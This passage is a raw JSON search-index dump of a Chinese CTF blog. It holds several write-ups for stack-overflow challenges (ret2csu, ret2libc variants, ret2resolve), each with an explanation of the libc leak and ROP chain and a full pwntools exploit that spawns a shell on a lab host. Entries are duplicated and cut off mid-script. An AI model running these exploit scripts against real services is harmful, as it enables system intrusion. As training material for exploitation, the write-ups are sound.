p64(write_got) + p64(8)\rpayload += p64(write_got) + p64(1) + p64(mov_addr) + b\u0026#39;a\u0026#39;*(0x8+8*6) + p64(main_addr)\rp.recvuntil(\u0026#39;Hello, World\\n\u0026#39;)\rp.sendline(payload)\rwrite_leak = u64(p.recv(6).ljust(8,b\u0026#39;\\x00\u0026#39;))\rprint(\u0026#39;write \u0026#39;,hex(write_leak))\rbase = write_leak - libc.symbols[\u0026#39;write\u0026#39;]\rsys_addr = base + libc.symbols[\u0026#39;system\u0026#39;]\rbin_addr = base + 0x18CE57\rprint(\u0026#39;system \u0026#39;,hex(sys_addr))\r#gdb.attach(p)\rpayload2 = b\u0026#39;A\u0026#39;*136 + p64(pop_rdi_ret) + p64(bin_addr) + p64(sys_addr)\rpause()\rp.recvuntil(\u0026#39;Hello, World\\n\u0026#39;)\rp.sendline(payload2)\rp.interactive() ","permalink":"https://jellyfish-pro.github.io/ctf/ret2csuinit_old/","summary":"首先查看具体信息：\n在程序中也没有system和/bin/sh\n栈也不是可读可写可执行。\n那我们选择通过泄露函数地址，来查找libc版本：\n那么问题又来了，这个程序没有puts函数，只有write函数，需要3个参数，而在x64我们需要用到rdi，rsi，rdx，而在程序中我们并没有找到pop_rdx。\n这时候我们就需要利用到_libc_csu_init函数了,这个函数是程序调用libc库时用来对程序进行初始化的函数，一般先于main函数执行，因此只要是动态链接程序，基本都会有这个函数。\n首先我们看到这个函数的汇编代码：\n这个函数的汇编中有这样一段。上面说到我们需要rdi，rsi，rdx，我们可以通过上半部分的mov指令将数据传从r13 r14 r15里传给rdx rsi rdi，而下半部分的一连串pop指令可以把数据给rbx rbp r12 r13 r14 r15。\n将参数传给rdi rsi rdx后，我们可以通过上半部分的call指令调用我们需要的函数，因为调用的地址是[r12 +rbx*8]，所以将函数地址存入r12中，再将rbx存入0就可以调用需要的函数了。\n.text:0000000000400616 add rsp, 8\r.text:000000000040061A pop rbx\t//设定为0\r.text:000000000040061B pop rbp\t//设定为1\r.text:000000000040061C pop r12\t//放入需要调用的函数地址\r.text:000000000040061E pop r13\t//放入第三个参数\r.text:0000000000400620 pop r14\t//放入第二个参数\r.text:0000000000400622 pop r15\t//放入第三个参数\r.text:0000000000400624 retn\t//返回到0x400600\r.text:0000000000400600 mov rdx, r13\t//第三个参数放入rdx\r.text:0000000000400603 mov rsi, r14\t//第二个参数放入rsi\r.text:0000000000400606 mov edi, r15d\t//第一个参数放入rdi\r.text:0000000000400609 call qword ptr [r12+rbx*8]//因为rbx为0，所以只有r12\r.","title":"ret2csuinit_old"},{"content":"首先查看基本信息：\n可以看到PIE未开启，但NX打开了。\n说明.text段的地址固定，但内存不可执行。\n因为是64位程序，所以我们需要考虑构造gadget\n拖入IDA查看一些基本信息：\n看到在main函数中，有一个gets函数，gets函数接收字符串时碰到\u0026rsquo;\\n\u0026rsquo;才会停止接收，通过这个特性我们就可以构造足够长的字符串，使得栈溢出，从而覆盖程序原本的栈，达到控制程序的目的。\n计算从接收第一个字符到函数返回值之间的偏移量：\n然后在IDA中用shift+f12,查看字符串：\n得到/bin/sh的地址。\n然后继续查看汇编，我们可以看到有一个call system的指令\n那么我们的思路就是，通过padding溢出到ret，然后让ret返回到call system的地址，让system调用/bin/sh的地址，这样就能够get shell。\n这/bin/sh的地址和system的地址都得到了，但是这是64位的文件，是通过寄存器，所以我们不能像32位一样将参数写入栈就不管了。\n所以这里我们不能通过将/bin/sh的地址放进栈中，而是要使用ROP找到指令将/bin/sh的地址放入寄存器rdi中：\n现在所有的要素都收集齐了，我们再理一下：\npayload = flat([\u0026#39;a\u0026#39;*120,p64(pop_rdi_ret),p64(bin_addr),p64(sys_addr)]) #ret2libc1\rfrom pwn import *\r#p = process(\u0026#34;./ret2libc1\u0026#34;)\rp = remote(\u0026#39;10.0.25.109\u0026#39;,10005)\rsys_addr = 0x400687\rbin_addr = 0x601048\rpop_rdi_ret = 0x400793\r#p.recvuntil(\u0026#34;Hello, what\u0026#39;s your name?\\n\u0026#34;)\rreact = \u0026#34;Hello, what\u0026#39;s your name?\\n\u0026#34;\rpayload = flat([\u0026#39;a\u0026#39;*120,p64(pop_rdi_ret),p64(bin_addr),p64(sys_addr)])\r#gdb.attach(p)\r#pause()\r#p.sendline(payload)\rp.sendlineafter(react,payload)\rp.interactive() ","permalink":"https://jellyfish-pro.github.io/ctf/ret2libc1_new/","summary":"首先查看基本信息：\n可以看到PIE未开启，但NX打开了。\n说明.text段的地址固定，但内存不可执行。\n因为是64位程序，所以我们需要考虑构造gadget\n拖入IDA查看一些基本信息：\n看到在main函数中，有一个gets函数，gets函数接收字符串时碰到\u0026rsquo;\\n\u0026rsquo;才会停止接收，通过这个特性我们就可以构造足够长的字符串，使得栈溢出，从而覆盖程序原本的栈，达到控制程序的目的。\n计算从接收第一个字符到函数返回值之间的偏移量：\n然后在IDA中用shift+f12,查看字符串：\n得到/bin/sh的地址。\n然后继续查看汇编，我们可以看到有一个call system的指令\n那么我们的思路就是，通过padding溢出到ret，然后让ret返回到call system的地址，让system调用/bin/sh的地址，这样就能够get shell。\n这/bin/sh的地址和system的地址都得到了，但是这是64位的文件，是通过寄存器，所以我们不能像32位一样将参数写入栈就不管了。\n所以这里我们不能通过将/bin/sh的地址放进栈中，而是要使用ROP找到指令将/bin/sh的地址放入寄存器rdi中：\n现在所有的要素都收集齐了，我们再理一下：\npayload = flat([\u0026#39;a\u0026#39;*120,p64(pop_rdi_ret),p64(bin_addr),p64(sys_addr)]) #ret2libc1\rfrom pwn import *\r#p = process(\u0026#34;./ret2libc1\u0026#34;)\rp = remote(\u0026#39;10.0.25.109\u0026#39;,10005)\rsys_addr = 0x400687\rbin_addr = 0x601048\rpop_rdi_ret = 0x400793\r#p.recvuntil(\u0026#34;Hello, what\u0026#39;s your name?\\n\u0026#34;)\rreact = \u0026#34;Hello, what\u0026#39;s your name?\\n\u0026#34;\rpayload = flat([\u0026#39;a\u0026#39;*120,p64(pop_rdi_ret),p64(bin_addr),p64(sys_addr)])\r#gdb.attach(p)\r#pause()\r#p.sendline(payload)\rp.sendlineafter(react,payload)\rp.interactive() ","title":"ret2libc1_new"},{"content":"首先查看相关信息\n可以看到，32位，没有开启canary，没有开启PIE，但是打开了NX。\n在IDA中我们可以看到system()函数：\n得到system()函数地址之后，我们还需要得到/bin/sh字符的地址。\n通过ROPgadget，我们可以查找到文件中是否存在/bin/sh字符：\n现在system() 的地址，/bin/sh 的地址都有了。\n接下来就是找到可利用的溢出点，算出到ret的偏移量：\n利用cyclic生成200个字符：\nshangdi4sb@ubuntu:~/pwntest/111$ cyclic 200\raaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab 用gdb打开ret2libc1，使用R命令让程序跑起来，输入生成的字符串，发现ret转跳到了奇怪的位置：\n再利用cyclic计算偏移量：\nshangdi4sb@ubuntu:~/pwntest/111$ cyclic -l 0x62616164\r112 现在我们知道了ret 的偏移量，知道了system()函数的地址，也知道了/bin/sh的地址，接下里就是需要将其连接到一起。\npayload = \u0026#39;a\u0026#39; * 112 + system_addr + \u0026#39;b\u0026#39; * 4 + /bin/sh_addr #ret2libc1.py\rfrom pwn import *\rp = remote(\u0026#34;10.0.25.109\u0026#34; , 10005)\rbinsh_addr = 0x8048720\rsystem_addr = 0x08048460\rpayload = flat([\u0026#39;a\u0026#39; * 112, system_addr, \u0026#39;b\u0026#39; * 4, binsh_addr])\r#注：因为system()函数在调用时，栈会向起传入4个字节当作system()函数的返回地址，所以构造4个b将其当作地址传给system()\rp.sendline(payload)\rp.interactive() ","permalink":"https://jellyfish-pro.github.io/ctf/ret2libc1_old/","summary":"首先查看相关信息\n可以看到，32位，没有开启canary，没有开启PIE，但是打开了NX。\n在IDA中我们可以看到system()函数：\n得到system()函数地址之后，我们还需要得到/bin/sh字符的地址。\n通过ROPgadget，我们可以查找到文件中是否存在/bin/sh字符：\n现在system() 的地址，/bin/sh 的地址都有了。\n接下来就是找到可利用的溢出点，算出到ret的偏移量：\n利用cyclic生成200个字符：\nshangdi4sb@ubuntu:~/pwntest/111$ cyclic 200\raaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab 用gdb打开ret2libc1，使用R命令让程序跑起来，输入生成的字符串，发现ret转跳到了奇怪的位置：\n再利用cyclic计算偏移量：\nshangdi4sb@ubuntu:~/pwntest/111$ cyclic -l 0x62616164\r112 现在我们知道了ret 的偏移量，知道了system()函数的地址，也知道了/bin/sh的地址，接下里就是需要将其连接到一起。\npayload = \u0026#39;a\u0026#39; * 112 + system_addr + \u0026#39;b\u0026#39; * 4 + /bin/sh_addr #ret2libc1.py\rfrom pwn import *\rp = remote(\u0026#34;10.0.25.109\u0026#34; , 10005)\rbinsh_addr = 0x8048720\rsystem_addr = 0x08048460\rpayload = flat([\u0026#39;a\u0026#39; * 112, system_addr, \u0026#39;b\u0026#39; * 4, binsh_addr])\r#注：因为system()函数在调用时，栈会向起传入4个字节当作system()函数的返回地址，所以构造4个b将其当作地址传给system()\rp.sendline(payload)\rp.interactive() ","title":"ret2libc1_old"},{"content":"首先使用checksec指令查看基本情况：\n再放入ida进行查看：\n可以看到并没有/bin/sh字符串，但是我们可以看到有gets函数和system函数\n所以我们的思路就是两次利用gets函数，第一次利用gets对栈进行布置，第二次利用gets输入/bin/sh。\n其中buf_addr是存放/bin/sh的地址，我们通过gdb中的vmmap指令可以查看哪一段代码是可写可读的：\n所以我们将/bin/sh写在0x601000中\npayload = b\u0026#39;a\u0026#39;*120 + p64(pop_rdi_ret) + p64(buf2_addr) + p64(gets_addr)\rpayload += p64(pop_rdi_ret) + p64(buf2_addr) + p64(sys_addr) #ret2libc2_x64\rfrom pwn import*\r#p = process(\u0026#39;./ret2libc2\u0026#39;)\rp = remote(\u0026#39;10.0.25.109\u0026#39;,10006)\rif args.G:\rgdb.attach(p)\rpause()\rsys_addr = 0x400570\rgets_addr = 0x400580\rpop_rdi_ret = 0x400793\rpop_rsi = 0x400791\rbuf2_addr = 0x601000\rcontext.log_level = \u0026#39;debug\u0026#39;\rpayload = b\u0026#39;a\u0026#39;*120 + p64(pop_rdi_ret) + p64(buf2_addr) + p64(gets_addr)\rpayload += p64(pop_rdi_ret) + p64(buf2_addr) + p64(sys_addr) p.sendlineafter(\u0026#39;: \\n\u0026#39;,payload)\rp.sendline(\u0026#39;/bin/sh\u0026#39;)\rp.interactive() ","permalink":"https://jellyfish-pro.github.io/ctf/ret2libc2_new/","summary":"首先使用checksec指令查看基本情况：\n再放入ida进行查看：\n可以看到并没有/bin/sh字符串，但是我们可以看到有gets函数和system函数\n所以我们的思路就是两次利用gets函数，第一次利用gets对栈进行布置，第二次利用gets输入/bin/sh。\n其中buf_addr是存放/bin/sh的地址，我们通过gdb中的vmmap指令可以查看哪一段代码是可写可读的：\n所以我们将/bin/sh写在0x601000中\npayload = b\u0026#39;a\u0026#39;*120 + p64(pop_rdi_ret) + p64(buf2_addr) + p64(gets_addr)\rpayload += p64(pop_rdi_ret) + p64(buf2_addr) + p64(sys_addr) #ret2libc2_x64\rfrom pwn import*\r#p = process(\u0026#39;./ret2libc2\u0026#39;)\rp = remote(\u0026#39;10.0.25.109\u0026#39;,10006)\rif args.G:\rgdb.attach(p)\rpause()\rsys_addr = 0x400570\rgets_addr = 0x400580\rpop_rdi_ret = 0x400793\rpop_rsi = 0x400791\rbuf2_addr = 0x601000\rcontext.log_level = \u0026#39;debug\u0026#39;\rpayload = b\u0026#39;a\u0026#39;*120 + p64(pop_rdi_ret) + p64(buf2_addr) + p64(gets_addr)\rpayload += p64(pop_rdi_ret) + p64(buf2_addr) + p64(sys_addr) p.","title":"ret2libc2_new"},{"content":"首先查看基本信息：\n开启了NX 保护，说明内存不可执行，但是对这道题来说，并不重要\n拖入IDA中查看代码：\n可以看到有gets函数。\n到这里我们的思路就和ret2libc1的思路一样，找到溢出点，计算ret的偏移量，将ret指向system函数，再使用system函数运行/bin/sh。\n随后我们查看文件中是否有system函数：\n有system函数，然后查看是否有/bin/sh：\n但我们在文件中，并没有找到/bin/sh。\n我们现在找到了gets函数、system函数、但并没有找到/bin/sh。\n这种情况我们就可以选择调用gets函数，将我们自己输入的/bin/sh存放到.bss段：\nBSS段通常是指用来存放程序中未初始化的或者初始化为0的全局变量和静态变量的一块内存区域。特点是可读写的，在程序执行之前BSS段会自动清0。可执行程序包括BSS段、数据段、代码段。 大概思路就是，我们先填充字符，填充掉第一次gets存放的地址，然后再让gets的返回值返回到gets函数开头，再次条用gets，这时输入shellcode，让gets将shellcode存放到.bss段，然后返回system函数，调用shellcode。\n计算gets函数ret的偏移量\npayload = flat([\u0026#34;a\u0026#34;*112,gets,system,buf2,buf2]) #ret2libc2\rfrom pwn import *\rp = remote(\u0026#34;10.0.25.109\u0026#34;,10006)\rsys_addr = 0x8048490\rgets_addr = 0x8048460\rbuf2_addr = 0x804A080\rpayload = flat([\u0026#34;a\u0026#34;*112,gets_addr,sys_addr,buf2_addr,buf2_addr])\rp.sendline(payload)\rp.sendline(\u0026#39;/bin/sh\u0026#39;)\rp.interactive() ","permalink":"https://jellyfish-pro.github.io/ctf/ret2libc2_old/","summary":"首先查看基本信息：\n开启了NX 保护，说明内存不可执行，但是对这道题来说，并不重要\n拖入IDA中查看代码：\n可以看到有gets函数。\n到这里我们的思路就和ret2libc1的思路一样，找到溢出点，计算ret的偏移量，将ret指向system函数，再使用system函数运行/bin/sh。\n随后我们查看文件中是否有system函数：\n有system函数，然后查看是否有/bin/sh：\n但我们在文件中，并没有找到/bin/sh。\n我们现在找到了gets函数、system函数、但并没有找到/bin/sh。\n这种情况我们就可以选择调用gets函数，将我们自己输入的/bin/sh存放到.bss段：\nBSS段通常是指用来存放程序中未初始化的或者初始化为0的全局变量和静态变量的一块内存区域。特点是可读写的，在程序执行之前BSS段会自动清0。可执行程序包括BSS段、数据段、代码段。 大概思路就是，我们先填充字符，填充掉第一次gets存放的地址，然后再让gets的返回值返回到gets函数开头，再次条用gets，这时输入shellcode，让gets将shellcode存放到.bss段，然后返回system函数，调用shellcode。\n计算gets函数ret的偏移量\npayload = flat([\u0026#34;a\u0026#34;*112,gets,system,buf2,buf2]) #ret2libc2\rfrom pwn import *\rp = remote(\u0026#34;10.0.25.109\u0026#34;,10006)\rsys_addr = 0x8048490\rgets_addr = 0x8048460\rbuf2_addr = 0x804A080\rpayload = flat([\u0026#34;a\u0026#34;*112,gets_addr,sys_addr,buf2_addr,buf2_addr])\rp.sendline(payload)\rp.sendline(\u0026#39;/bin/sh\u0026#39;)\rp.interactive() ","title":"ret2libc2_old"},{"content":"首先查看基本信息：\nv1 大小为 0x70，ret 大小为 8，故 padding 为 0x78\n然后查看/bin/sh 和 system：\n并没有/bin/sh 和 system。\n搜索 syscall 也没有找到\n这种情况下我们只能选择泄露函数地址，查找 libc.so 版本来调用函数了。\n通过 IDA 查看伪代码，我们可以看到程序调用 puts 函数和 setbuf 函数，于是我们选择泄露 这俩函数的地址来查找 libc 的版本：\nfrom pwn import *\rcontext.log_level = \u0026#39;debug\u0026#39;\rp = remote(\u0026#39;10.0.25.109\u0026#39;,10007)\r#p = process(\u0026#39;./ret2libc3\u0026#39;)\rif args.G:\rgdb.attach(p)\rpause()\relf = ELF(\u0026#39;./ret2libc3\u0026#39;)\rmain = 0x4006AE\rpop_rdi_ret = 0x400743\rputs_addr = 0x400695\rpop_rsi_r15_ret = 0x400741\rpayload = b\u0026#39;a\u0026#39;*120+p64(pop_rdi_ret) + p64(elf.got[\u0026#39;puts\u0026#39;]) payload += p64(elf.plt[\u0026#39;puts\u0026#39;]) + p64(main)\rdemo = \u0026#39;in: \\n\u0026#39;\rp.sendlineafter(demo,payload)\rputs = u64(p.recv(6).ljust(8,b\u0026#39;\\x00\u0026#39;))\rprint(\u0026#39;puts\u0026#39;,hex(puts)) 得到地址后我们通过新的工具：https://github.com/niklasb/libc-database\n之前的 libcsearcher 是 python2 时代的工具，在从 python2 向 python3 转型的过程中，缺少 了更新，所以有时查找道德 libc 版本可能不准确。\n新的工具提供了一个在线使用的网站：https://libc.rip/\n除此之外也可 clone 到本地，通过指令进行使用：\n这里我们通过网站进行查询：\n查找到了两个结果：\n这两个结果只有 str_bin_sh 的偏移大小有区别，因此我们只有挨个尝试或者选择泄露其他地 址 不 一 样 的 函 数 ， 在 经 过 最 后 的 筛 选 ， 发 现 是 libc 的 版 本 号 为 [libc6_2.23-0ubuntu11.3_amd64]：\n因此我们的 payload 为：\nlibcbase = puts-0x6f6a0\rsystem = libcbase + 0x453a0\rbin_sh = libcbase + 0x18ce57\rprint(\u0026#39;system\u0026#39;,hex(system))\rprint(\u0026#39;binsh\u0026#39;,hex(bin_sh))\rpayload2 = b\u0026#39;a\u0026#39;*120 + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)\rp.sendline(payload2)\rp.interactive() 补充\n当本题目需要进入远程靶场时，务必以靶场所使用的 libc 版本为准。仅仅是在本地打通获得 本地 shell 并不能保证一定会取得远程 shell。\n除此之外，因为不同的 libc 对函数的处理也不一样，可能会遇到需要内存对齐的问题，例如 本题，使用同样的 payload，攻击远程则可以获得 shell，但在本地则不可以：\n通过 gdb.attach 则可以看到程序卡在了 movaps 指令处\n这是因为 movaps 指令在 64 位下会涉及到内存对齐 16-byte 的问题\n在 gdb 中直观的来看，就是运行到这里时，rsp 指向的内存地址的最后一位必须是 0。\n那么解决方法就是我们修改 payload，使得 rsp 对齐。\npayload2 = b\u0026#39;a\u0026#39;*120 payload2 += p64(pop_rsi_r15_ret) //八位地址，内存最后一位变为 0\rpayload2 += p64(bin_sh) //八位地址，内存最后一位变为 8\rpayload2 += p64(bin_sh) //八位地址，内存最后一位变为 0\rpayload2 += p64(pop_rdi_ret) + p64(bin_sh) + p64(system) //原本的 payload 这样就使得运行到这里时，内存对齐了\n","permalink":"https://jellyfish-pro.github.io/ctf/ret2libc3_new/","summary":"首先查看基本信息：\nv1 大小为 0x70，ret 大小为 8，故 padding 为 0x78\n然后查看/bin/sh 和 system：\n并没有/bin/sh 和 system。\n搜索 syscall 也没有找到\n这种情况下我们只能选择泄露函数地址，查找 libc.so 版本来调用函数了。\n通过 IDA 查看伪代码，我们可以看到程序调用 puts 函数和 setbuf 函数，于是我们选择泄露 这俩函数的地址来查找 libc 的版本：\nfrom pwn import *\rcontext.log_level = \u0026#39;debug\u0026#39;\rp = remote(\u0026#39;10.0.25.109\u0026#39;,10007)\r#p = process(\u0026#39;./ret2libc3\u0026#39;)\rif args.G:\rgdb.attach(p)\rpause()\relf = ELF(\u0026#39;./ret2libc3\u0026#39;)\rmain = 0x4006AE\rpop_rdi_ret = 0x400743\rputs_addr = 0x400695\rpop_rsi_r15_ret = 0x400741\rpayload = b\u0026#39;a\u0026#39;*120+p64(pop_rdi_ret) + p64(elf.got[\u0026#39;puts\u0026#39;]) payload += p64(elf.","title":"ret2libc3_new"},{"content":"首先查看文件基本属性：\n看到文件并没有开启PIE，所以代码段的地址是相对固定的。\n然后查看是否有system函数和/bin/sh\n可以看到并没有system函数，也没有/bin/sh\n搜索int 0x80也可以看到并没有：\n没有int 0x80也不能调用execve函数\n虽然我们没有搜索到system函数和/bin/sh，那么这就意味着，函数中没有吗，我们打开gdb进行搜索：\n可以看到，在gdb中我们可以搜索到相应的函数和字符，并且他们都指向了libc-2.31.so\nlibc.so是动态链接库，在libc中函数之间的偏移量是固定的，也就是说，如果我们知道了基地址和system的偏移量，我们就可以调用system函数，同理，/bin/sh也可以用这样的办法调用。\n那么如何获得基地址呢？我们可以利用已知函数的真实地址减去这个函数的偏移地址，那么就等于基地址。\n现在我们使用puts函数举例：\n​\t当程序第一次调用puts时，程序会跳转到plt表，查找puts函数，然后根据plt表的引导去动态链接库中调用函数，并且把puts函数的真实地址存放到got表中，当程序第二次调用puts时，就会直接去got表找puts函数的地址，而不是再次去plt表。\n所以我们可以使用函数自身的puts函数，输出puts在got表中的地址：\npayload = b\u0026#39;a\u0026#39;*(0x6c+4) //padding\r+p32(elf.plt[\u0026#39;puts\u0026#39;]) //使函数转跳到puts函数\r+p32(main)\t//puts函数的返回值\r+p32(elf.got[\u0026#39;puts\u0026#39;]) //利用puts函数输出puts函数的gots表上的地址 上面利用了puts输出了puts函数的真实地址，接下来就是接收这个地址，计算基地址：\nputs=u32(p.recv(4))\t//将接收到的地址放入puts中\rprint(\u0026#39;puts\u0026#39;,hex(puts))\tlibc =LibcSearcher(\u0026#39;puts\u0026#39;,puts)\t//在libcsearcher中寻找puts函数的偏移量\rlibcbase=puts-libc.dump(\u0026#39;puts\u0026#39;)\t//计算基址\rsystem=libcbase+libc.dump(\u0026#39;system\u0026#39;)\t//计算出system函数的真实地址\rbin_sh=libcbase+libc.dump(\u0026#39;str_bin_sh\u0026#39;)\t///bin/sh的真实地址\rprint(\u0026#39;system\u0026#39;,hex(system))\rprint(\u0026#39;binsh\u0026#39;,hex(bin_sh)) 在这里我们要介绍一下LibcSearcher，这是一个查找libc版本，寻找函数在libc.so里偏移的python库,可以在github上直接搜到和安装，并且在github上就有下载方法和使用方法\n因为上面输出puts地址时，我们重新返回了main函数，所以我们将新的payload发送过去：\npayload2=b\u0026#39;a\u0026#39;*(0x64+4)+p32(system)+p32(0xdeadbeef)+p32(bin_sh) from pwn import *\rfrom LibcSearcher import *\r#context.log_level = \u0026#39;debug\u0026#39;\rp = remote(\u0026#39;10.0.25.109\u0026#39;,10007)\r#p = process(\u0026#39;./ret2libc3\u0026#39;)\relf = ELF(\u0026#39;./ret2libc3\u0026#39;)\rmain = 0x08048618\rif args.G:\rgdb.attach(p)\rpayload = b\u0026#39;a\u0026#39;*(0x6c+4)+p32(elf.plt[\u0026#39;puts\u0026#39;])+p32(main)+p32(elf.got[\u0026#39;puts\u0026#39;])\rp.recvuntil(\u0026#39;?\u0026#39;)\rp.sendline(payload)\rputs = u32(p.recv(4))\rprint(\u0026#39;puts\u0026#39;,hex(puts))\rlibc = LibcSearcher(\u0026#39;puts\u0026#39;,puts)\rlibcbase = puts-libc.dump(\u0026#39;puts\u0026#39;)\rsystem = libcbase+libc.dump(\u0026#39;system\u0026#39;)\rbin_sh = libcbase+libc.dump(\u0026#39;str_bin_sh\u0026#39;)\rprint(\u0026#39;system\u0026#39;,hex(system))\rprint(\u0026#39;binsh\u0026#39;,hex(bin_sh))\rpayload2 = b\u0026#39;a\u0026#39;*(0x64+4)+p32(system)+p32(0xdeadbeef)+p32(bin_sh)\rp.sendline(payload2)\rp.interactive() 运行ret2libc3.py后，libcsearcher会让我们选择libc版本，我们选择程序的版本就行了\n","permalink":"https://jellyfish-pro.github.io/ctf/ret2libc3_old/","summary":"首先查看文件基本属性：\n看到文件并没有开启PIE，所以代码段的地址是相对固定的。\n然后查看是否有system函数和/bin/sh\n可以看到并没有system函数，也没有/bin/sh\n搜索int 0x80也可以看到并没有：\n没有int 0x80也不能调用execve函数\n虽然我们没有搜索到system函数和/bin/sh，那么这就意味着，函数中没有吗，我们打开gdb进行搜索：\n可以看到，在gdb中我们可以搜索到相应的函数和字符，并且他们都指向了libc-2.31.so\nlibc.so是动态链接库，在libc中函数之间的偏移量是固定的，也就是说，如果我们知道了基地址和system的偏移量，我们就可以调用system函数，同理，/bin/sh也可以用这样的办法调用。\n那么如何获得基地址呢？我们可以利用已知函数的真实地址减去这个函数的偏移地址，那么就等于基地址。\n现在我们使用puts函数举例：\n​\t当程序第一次调用puts时，程序会跳转到plt表，查找puts函数，然后根据plt表的引导去动态链接库中调用函数，并且把puts函数的真实地址存放到got表中，当程序第二次调用puts时，就会直接去got表找puts函数的地址，而不是再次去plt表。\n所以我们可以使用函数自身的puts函数，输出puts在got表中的地址：\npayload = b\u0026#39;a\u0026#39;*(0x6c+4) //padding\r+p32(elf.plt[\u0026#39;puts\u0026#39;]) //使函数转跳到puts函数\r+p32(main)\t//puts函数的返回值\r+p32(elf.got[\u0026#39;puts\u0026#39;]) //利用puts函数输出puts函数的gots表上的地址 上面利用了puts输出了puts函数的真实地址，接下来就是接收这个地址，计算基地址：\nputs=u32(p.recv(4))\t//将接收到的地址放入puts中\rprint(\u0026#39;puts\u0026#39;,hex(puts))\tlibc =LibcSearcher(\u0026#39;puts\u0026#39;,puts)\t//在libcsearcher中寻找puts函数的偏移量\rlibcbase=puts-libc.dump(\u0026#39;puts\u0026#39;)\t//计算基址\rsystem=libcbase+libc.dump(\u0026#39;system\u0026#39;)\t//计算出system函数的真实地址\rbin_sh=libcbase+libc.dump(\u0026#39;str_bin_sh\u0026#39;)\t///bin/sh的真实地址\rprint(\u0026#39;system\u0026#39;,hex(system))\rprint(\u0026#39;binsh\u0026#39;,hex(bin_sh)) 在这里我们要介绍一下LibcSearcher，这是一个查找libc版本，寻找函数在libc.so里偏移的python库,可以在github上直接搜到和安装，并且在github上就有下载方法和使用方法\n因为上面输出puts地址时，我们重新返回了main函数，所以我们将新的payload发送过去：\npayload2=b\u0026#39;a\u0026#39;*(0x64+4)+p32(system)+p32(0xdeadbeef)+p32(bin_sh) from pwn import *\rfrom LibcSearcher import *\r#context.log_level = \u0026#39;debug\u0026#39;\rp = remote(\u0026#39;10.0.25.109\u0026#39;,10007)\r#p = process(\u0026#39;./ret2libc3\u0026#39;)\relf = ELF(\u0026#39;./ret2libc3\u0026#39;)\rmain = 0x08048618\rif args.G:\rgdb.attach(p)\rpayload = b\u0026#39;a\u0026#39;*(0x6c+4)+p32(elf.","title":"ret2libc3_old"},{"content":"首先查看基本情况：\n在IDA里我们可以看到main函数和产生溢出的函数：\n我们可以看到，main函数中有一个write函数，而vuln函数中有溢出点。\n那么我们可以使用write函数来泄露函数地址，从而得到libc版本，再通过/bin/sh和system函数的偏移量来做这道题。\n首先我们需要泄露服务器端的函数地址：\nfrom pwn import *\rcontext.log_level = \u0026#39;debug\u0026#39;\rp = remote(\u0026#39;10.0.25.109\u0026#39;,10009)\relf = ELF(\u0026#39;ret2resolve\u0026#39;)\r#p = process(\u0026#39;./ret2resolve\u0026#39;)\rif args.G:\rgdb.attach(p)\rpayload = 112 * b\u0026#39;a\u0026#39;\rpayload += p32(elf.plt[\u0026#39;write\u0026#39;])\rpayload += p32(elf.symbols[\u0026#39;main\u0026#39;])\rpayload += p32(1)\rpayload += p32(elf.got[\u0026#39;write\u0026#39;])\rpayload += p32(4)\rpayload += p32(elf.symbols[\u0026#39;main\u0026#39;])\rp.sendline(payload)\rwrite_addr = u32(p.recvuntil(\u0026#39;\\xf7\u0026#39;)[-4:])\r#write_addr = u32(p.recv(4))\rprint(\u0026#39;write_addr =\u0026#39;,hex(write_addr)) 运行脚本后，就可以打印出write函数的地址：\n可以看到，函数的后12位是460。\n然后修改一下上面的脚本，我们可以输出一些其他的函数：\n我们使用ret2libc3中提到的查看libc版本的网址：https://libc.rip/\n这样，libc的版本就被泄露了。然后根据偏移量，我们可以计算出程序的基地址和system函数和/bin/sh的地址：\nlibcbase = write_addr - 0xd44d0\rsystem = libcbase + 0x3a950\rbinsh = libcbase + 0x15912b\rpayload = 112 * b\u0026#39;a\u0026#39;\rpayload += p32(system)\rpayload += p32(0xdeadbeef)\rpayload += p32(binsh)\rsh.sendline(payload)\rsh.interactive() 完整的exp：\nfrom pwn import *\rcontext.log_level = \u0026#39;debug\u0026#39;\r#sh = process(\u0026#39;./ret2resolve\u0026#39;)\rsh = remote(\u0026#39;10.0.25.109\u0026#39;,10009)\relf = ELF(\u0026#39;./ret2resolve\u0026#39;)\r#libc = ELF(\u0026#39;libc.so.6\u0026#39;)\rpayload = 112 * b\u0026#39;a\u0026#39;\rpayload += p32(elf.plt[\u0026#39;write\u0026#39;])\rpayload += p32(elf.symbols[\u0026#39;main\u0026#39;])\rpayload += p32(1)\rpayload += p32(elf.got[\u0026#39;write\u0026#39;])\rpayload += p32(4)\rsh.sendline(payload)\rwrite_addr = u32(sh.recvuntil(\u0026#39;\\xf7\u0026#39;)[-4:])\rprint(hex(write_addr))\rlibcbase = write_addr - 0xd44d0\rsystem = libcbase + 0x3a950\rbinsh = libcbase + 0x15912b\rpayload = 112 * b\u0026#39;a\u0026#39;\rpayload += p32(system)\rpayload += p32(0xdeadbeef)\rpayload += p32(binsh)\rsh.sendline(payload)\rsh.interactive() ","permalink":"https://jellyfish-pro.github.io/ctf/ret2resolve1/","summary":"首先查看基本情况：\n在IDA里我们可以看到main函数和产生溢出的函数：\n我们可以看到，main函数中有一个write函数，而vuln函数中有溢出点。\n那么我们可以使用write函数来泄露函数地址，从而得到libc版本，再通过/bin/sh和system函数的偏移量来做这道题。\n首先我们需要泄露服务器端的函数地址：\nfrom pwn import *\rcontext.log_level = \u0026#39;debug\u0026#39;\rp = remote(\u0026#39;10.0.25.109\u0026#39;,10009)\relf = ELF(\u0026#39;ret2resolve\u0026#39;)\r#p = process(\u0026#39;./ret2resolve\u0026#39;)\rif args.G:\rgdb.attach(p)\rpayload = 112 * b\u0026#39;a\u0026#39;\rpayload += p32(elf.plt[\u0026#39;write\u0026#39;])\rpayload += p32(elf.symbols[\u0026#39;main\u0026#39;])\rpayload += p32(1)\rpayload += p32(elf.got[\u0026#39;write\u0026#39;])\rpayload += p32(4)\rpayload += p32(elf.symbols[\u0026#39;main\u0026#39;])\rp.sendline(payload)\rwrite_addr = 